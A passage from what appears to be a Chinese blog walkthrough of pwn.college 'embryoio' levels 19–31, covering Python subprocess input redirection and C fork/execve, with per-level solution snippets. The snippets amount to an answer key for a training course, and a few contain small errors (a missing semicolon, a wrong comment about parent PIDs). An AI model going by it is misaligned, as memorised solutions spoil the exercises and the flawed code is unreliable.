(runoob.com)</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>args<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">input</span><span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> stderr<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> cwd<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> check<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> env<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> universal_newlines<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>args：表示要执行的命令。必须是一个字符串，字符串参数列表。</li><li>stdin、stdout 和 stderr：子进程的标准输入、输出和错误。其值可以是 subprocess.PIPE、subprocess.DEVNULL、一个已经存在的文件描述符、已经打开的文件对象或者 None。subprocess.PIPE 表示为子进程创建新的管道。subprocess.DEVNULL 表示使用 os.devnull。默认使用的是 None，表示什么都不做。另外，stderr 可以合并到 stdout 里一起输出。</li><li>timeout：设置命令超时时间。如果命令执行时间超时，子进程将被杀死，并弹出 TimeoutExpired 异常。</li><li>check：如果该参数设置为 True，并且进程退出状态码不是 0，则弹 出 CalledProcessError 异常。</li><li>encoding: 如果指定了该参数，则 stdin、stdout 和 stderr 可以接收字符串数据，并以该编码方式编码。否则只接收 bytes 类型的数据。</li><li>shell：如果该参数为 True，将通过操作系统的 shell 执行指定的命令。</li><li>input:程序运行后的交互输入  注意与stdin区分</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocess<span class="token comment"># 定义命令及其参数</span>command <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"/challenge/embryoio_level19"</span><span class="token punctuation">]</span><span class="token comment"># 打开输入文件并读取数据</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/xhekoe"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    input_data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 使用subprocess.run()执行命令并重定向输入</span>result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>command<span class="token punctuation">,</span> <span class="token builtin">input</span><span class="token operator">=</span>input_data<span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span class="token comment"># 打印输出结果</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"stdout:"</span><span class="token punctuation">,</span> result<span class="token punctuation">.</span>stdout<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"stderr:"</span><span class="token punctuation">,</span> result<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然而提示</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>ADVICE<span class="token punctuation">]</span> File descriptors are inherited from the parent, unless the FD_CLOEXEC is <span class="token builtin class-name">set</span> by the parent on the <span class="token function">file</span> descriptor.<span class="token punctuation">[</span>ADVICE<span class="token punctuation">]</span> For security reasons, some programs, such as python, <span class="token keyword">do</span> this by default <span class="token keyword">in</span> certain cases. Be careful <span class="token keyword">if</span> you are<span class="token punctuation">[</span>ADVICE<span class="token punctuation">]</span> creating and trying to pass <span class="token keyword">in</span> FDs <span class="token keyword">in</span> python.<span class="token punctuation">[</span>FAIL<span class="token punctuation">]</span> You did not satisfy all the execution requirements.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocess<span class="token comment"># 定义命令及其参数</span>command <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"/challenge/embryoio_level19"</span><span class="token punctuation">]</span><span class="token comment"># 打开输入文件并读取数据</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/xhekoe"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span><span class="token comment"># 使用subprocess.run()执行命令并重定向输入</span>    result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>command<span class="token punctuation">,</span> stdin<span class="token operator">=</span>f<span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span class="token comment"># 打印输出结果</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"stdout:"</span><span class="token punctuation">,</span> result<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"stderr:"</span><span class="token punctuation">,</span> result<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>事实上必须要用<code>stdin</code>传入,两者是有区别的:</p><p>在Linux系统中，标准输入流（stdin）是指向终端（通常是键盘）的文件描述符。当你在终端上键入数据时，这些数据被发送到正在运行的程序的标准输入流中。</p><p><code>FD_CLOEXEC</code> 是一个常量，通常在操作系统中用于文件描述符（file descriptor）。它是文件描述符标志之一，用于指示当执行 <code>exec</code> 系列函数时，文件描述符是否应该关闭。</p><ol><li><strong>input 参数</strong>：<ul><li><code>input</code> 参数是一个字节串（bytes）或者 None。</li><li>如果指定了 <code>input</code> 参数且不为 None，那么它会作为子进程的标准输入。</li><li>如果 <code>input</code> 参数为 None（默认情况），则子进程的标准输入为空。</li><li>当你有一个字节串数据需要传递给子进程作为标准输入时，可以使用 <code>input</code> 参数。</li></ul></li><li><strong>stdin 参数</strong>：<ul><li><code>stdin</code> 参数是一个文件对象或者一个文件描述符。</li><li>如果指定了 <code>stdin</code> 参数，那么它会作为子进程的标准输入。</li><li>如果 <code>stdin</code> 参数为 None（默认情况），则子进程的标准输入将会从 <code>/dev/null</code> 中读取空数据。</li><li>当你已经有一个已经打开的文件对象或者文件描述符，想要将其传递给子进程作为标准输入时，可以使用 <code>stdin</code> 参数</li></ul></li></ol><p>根据提示，<code>input</code>不会传递<code>FD_CLOEXEC</code>而<code>stdin</code>则会传递<code>FD_CLOEXEC</code></p><p>当然我们这题包含库文件可以很好的解决这个问题，事实上题目可能是要要求我们手搓,<s>我们用轮子绕过了这一个过程</s></p><p>手搓一个试试</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">run_program_with_input</span><span class="token punctuation">(</span>program_path<span class="token punctuation">,</span> input_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 打开输入文件</span>    input_fd <span class="token operator">=</span> os<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> os<span class="token punctuation">.</span>O_RDONLY<span class="token punctuation">)</span>        <span class="token comment"># 创建子进程</span>    pid <span class="token operator">=</span> os<span class="token punctuation">.</span>fork<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 子进程</span>        <span class="token comment"># 重定向子进程的标准输入到输入文件</span>        os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>input_fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token comment"># 执行外部程序</span>        os<span class="token punctuation">.</span>execl<span class="token punctuation">(</span>program_path<span class="token punctuation">,</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>basename<span class="token punctuation">(</span>program_path<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>  <span class="token comment"># 父进程</span>        <span class="token comment"># 等待子进程结束</span>        os<span class="token punctuation">.</span>waitpid<span class="token punctuation">(</span>pid<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token comment"># 关闭文件描述符</span>        os<span class="token punctuation">.</span>close<span class="token punctuation">(</span>input_fd<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    program_path <span class="token operator">=</span> <span class="token string">"./your_program"</span>    input_file <span class="token operator">=</span> <span class="token string">"./input.txt"</span>    run_program_with_input<span class="token punctuation">(</span>program_path<span class="token punctuation">,</span> input_file<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level20"><a class="markdownIt-Anchor" href="#level20"></a> level20</h3><p>有了上题的经验</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocess<span class="token comment"># 打开并读取文件内容</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/tmp/rfqbmu'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span><span class="token comment"># 将文件内容作为输入传递给子进程</span>    result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/challenge/embryoio_level20'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>f<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后直接cat就可以了</p><h3 id="level21"><a class="markdownIt-Anchor" href="#level21"></a> level21</h3><p><code>subprocess.run(['env','-i','/challenge/embryoio_level21'])</code></p><h3 id="level22"><a class="markdownIt-Anchor" href="#level22"></a> level22</h3><p>md，又来一轮，把上面的脚本<code>ipython</code>运行改为<code>python</code>运行，真是服了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">subprocess.run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'env'</span>,<span class="token string">'-i'</span>,<span class="token string">'/challenge/embryoio_level22'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level23"><a class="markdownIt-Anchor" href="#level23"></a> level23</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">subprocess.run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'./embryoio_level23'</span><span class="token punctuation">]</span>,input<span class="token operator">=</span>b<span class="token string">"eyejkdde"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level24"><a class="markdownIt-Anchor" href="#level24"></a> level24</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">subprocess.run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/challenge/embryoio_level24'</span>,<span class="token string">"yogjcbumez"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level25"><a class="markdownIt-Anchor" href="#level25"></a> level25</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/challenge/embryoio_level25'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>env<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"qpvtwc"</span><span class="token punctuation">:</span><span class="token string">"eghdabuygy"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level26"><a class="markdownIt-Anchor" href="#level26"></a> level26</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/sjfilu"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/challenge/embryoio_level26'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stdin<span class="token operator">=</span>f<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="level27"><a class="markdownIt-Anchor" href="#level27"></a> level27</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/zjvuap"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/challenge/embryoio_level27'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stdin<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>stdout<span class="token operator">=</span>f<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="level28"><a class="markdownIt-Anchor" href="#level28"></a> level28</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/challenge/embryoio_level28'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stdin<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>env<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level29"><a class="markdownIt-Anchor" href="#level29"></a> level29</h3><p>现在到C语言编程的篇章了</p><p>这部分对linux系统进程的创建调用需要理解清除</p><p><a href="https://www.geeksforgeeks.org/difference-fork-exec/#">Difference between fork() and exec() - GeeksforGeeks</a></p><p>听一遍课感觉还是收获很大</p><p>题目要求<code>fork</code>开子进程然后调用文件</p><ul><li>在父进程中，<code>pid</code> 的值是新创建的子进程的进程 ID。这个值会大于 0。</li><li>在子进程中，<code>pid</code> 的值是 0，用来表示当前正在执行的代码是子进程部分。</li><li>对父进程的检测需要使用exec()系列的函数，因为system()或popen()函数都会执行一个shell，然后用shell来执行，所以此时父进程为shell（测试后是dash），而不是你的程序。</li><li>而exec()只是替换掉正在exec()的进程，当用fork()函数时子进程调用exec()系列函数杀死自己的子进程副本的时候就会建立与当前主进程的父子关系。</li><li>当一个父亲创建了一个孩子但没有等它结束就自己结束的话就可能造成系统异常，查询waitpid()的使用来等待孩子进程。</li></ul><p>另外查询了一下，说是exec系统调用，实际上在Linux中，并不存在一个exec()的函数形式，exec指的是一组函数，一共有6个，分别是：</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;unistd.h&gt;int execl(const char *path, const char *arg, ...);int execlp(const char *file, const char *arg, ...);int execle(const char *path, const char *arg, ..., char *const envp[]);int execv(const char *path, char *const argv[]);int execvp(const char *file, char *const argv[]);int execve(const char *path, char *const argv[], char *const envp[]);const char *filename：表示要执行的程序的文件路径。这个参数指定了要执行的程序的路径。通常情况下，应该提供程序的绝对路径，以确保系统可以找到并正确执行程序。如果程序在 PATH 环境变量中，则可以直接提供程序的名称。char *const argv[]：表示程序的命令行参数列表。这个参数是一个字符串数组，每个字符串都是一个命令行参数。数组的第一个元素通常是程序的名称，后续元素是传递给程序的命令行参数。数组的最后一个元素必须是 NULL，以表示参数列表的结束。char *const envp[]：表示程序的环境变量列表。这个参数是一个字符串数组，每个字符串都是一个环境变量设置，格式为 &quot;name&#x3D;value&quot;。数组的最后一个元素也必须是 NULL，以表示环境变量列表的结束。下面是这些参数的详细说明：filename：是一个字符串，指定了要执行的程序的路径。如果路径指向一个可执行文件，则 execve() 将加载并执行该文件。注意，execve() 不会查找 PATH 环境变量中指定的路径，因此必须提供绝对路径或者相对路径。argv[]：是一个字符串数组，用于传递命令行参数给新程序。数组的第一个元素通常是程序的名称，后续元素是程序的命令行参数。数组的最后一个元素必须是 NULL，以表示参数列表的结束。envp[]：是一个字符串数组，用于传递环境变量给新程序。每个字符串都是一个环境变量设置，格式为 &quot;name&#x3D;value&quot;。数组的最后一个元素必须是 NULL，以表示环境变量列表的结束。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>​<span class="token keyword">void</span> <span class="token function">pwncollege</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>env<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/challenge/embryoio_level29"</span><span class="token punctuation">,</span>argv<span class="token punctuation">,</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//使用exec系列函数执行时不会改变新进程的父亲，相当于只是将当前进>程替换掉了</span>    <span class="token keyword">return</span> <span class="token punctuation">;</span><span class="token punctuation">&#125;</span>​    <span class="token comment">//char *argv[]是一个指针数组，指向传入的参数，每个指针都指向一个字符串</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> env<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">pid_t</span> fpid<span class="token punctuation">;</span>​    fpid<span class="token operator">=</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//fork()执行之后，会复制一个基本一样的进程作为子进程，然后两个进程会分别执行后面的代码</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fpid<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">//如果fpid为-1，说明fork失败</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error in fork!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>fpid<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//成功则会出现两个进程，fpid==0的是子进程</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"我是子进程\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">pwncollege</span><span class="token punctuation">(</span>argv<span class="token punctuation">,</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token comment">//fpid==1的是父进程</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"我是父进程\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//等待子进程结束</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>弄懂了基本原理后</p><p>写出一个简单的运行程序</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span><span class="token keyword">void</span> <span class="token function">pwncollege</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>env<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>newargv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"embryoio_level29"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/challenge/embryoio_level29"</span><span class="token punctuation">,</span>newargv<span class="token punctuation">,</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>env<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">pid_t</span> fpid<span class="token punctuation">;</span>    fpid<span class="token operator">=</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fpid<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Error in fork!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>fpid<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Im child!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">pwncollege</span><span class="token punctuation">(</span>argv<span class="token punctuation">,</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>fpid<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Im Parent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level30"><a class="markdownIt-Anchor" href="#level30"></a> level30</h3><p>同上多个密码传参</p><h3 id="level31"><a class="markdownIt-Anchor" href="#level31"></a> level31</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span><span class="token keyword">void</span> <span class="token function">pwncollege</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>env<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>newargv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"embryoio_level31"</span><span class="token punctuation">,</span><span class="token string">"aomapmyibu"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>env<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">&#125;</span>    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/challenge/embryoio_level31"</span><span class="token punctuation">,</span>newargv<span class="token punctuation">,</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>env<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">pid_t</span> fpid<span class="token punctuation">;</span>    fpid<span class="token operator">=</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fpid<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Error in fork!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>fpid<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Im child!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">pwncollege</span><span class="token punctuation">(</span>argv<span class="token punctuation">,</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>fpid<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Im Parent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 